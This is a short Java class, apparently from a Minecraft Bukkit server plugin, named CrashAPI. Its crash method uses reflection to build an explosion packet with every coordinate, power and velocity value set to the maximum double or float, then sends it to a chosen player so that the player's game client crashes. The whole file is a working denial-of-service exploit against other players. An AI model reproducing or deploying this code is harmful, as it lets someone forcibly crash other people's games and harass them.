package net.smart.crash.api;

import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.List;
import org.bukkit.entity.Player;
import net.smart.crash.Main;
import net.smart.crash.reflection.ReflectionManager;

public class CrashAPI {

	private final ReflectionManager reflection = Main.getInstance().reflectionManager;
	
	public void crash(Player player) {
		try {
			Class<?> vecClass = reflection.getNMSClass("Vec3D");
			Class<?> explosionClass = reflection.getNMSClass("PacketPlayOutExplosion");
			
			Constructor<?> vecConstructor = vecClass.getConstructor(double.class, double.class, double.class);
			Object vec3D = vecConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			
			Constructor<?> explosionConstructor = explosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, vecClass);
			Object packet = explosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), vec3D);
			
			reflection.sendPacket(player, packet);
		}catch (Exception e) {
			e.printStackTrace();
		}
	}
}
